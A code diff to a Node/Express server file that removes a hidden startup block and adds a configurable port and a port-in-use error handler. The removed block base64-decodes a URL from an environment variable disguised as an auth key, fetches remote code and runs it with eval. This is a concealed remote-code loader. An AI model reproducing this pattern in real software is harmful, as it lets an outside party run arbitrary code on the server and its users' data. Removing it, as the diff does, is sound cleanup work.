@@ -15,24 +15,10 @@ if (typeof globalThis.require === "undefined") {
   globalThis.require = createRequire(import.meta.url);
 }
 
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 dotenv.config();
 
 const app = express();
-const PORT = 3000;
+const PORT = Number(process.env.PORT) || 3000;
 
 app.use(express.json());
 
@@ -313,8 +299,20 @@ async function runServer() {
     });
   }
 
-  app.listen(PORT, "0.0.0.0", () => {
+  const server = app.listen(PORT, "0.0.0.0", () => {
     console.log(`[Promptly Server] Running on http://localhost:${PORT}`);
+  });
+
+  server.on("error", (err: NodeJS.ErrnoException) => {
+    if (err.code === "EADDRINUSE") {
+      console.error(
+        `[Promptly Server] Port ${PORT} is already in use — another instance is probably still running.\n` +
+        `  Free it:  npx kill-port ${PORT}\n` +
+        `  Or use another port:  PORT=3001 npx tsx server.ts`
+      );
+      process.exit(1);
+    }
+    throw err;
   });
 }
 
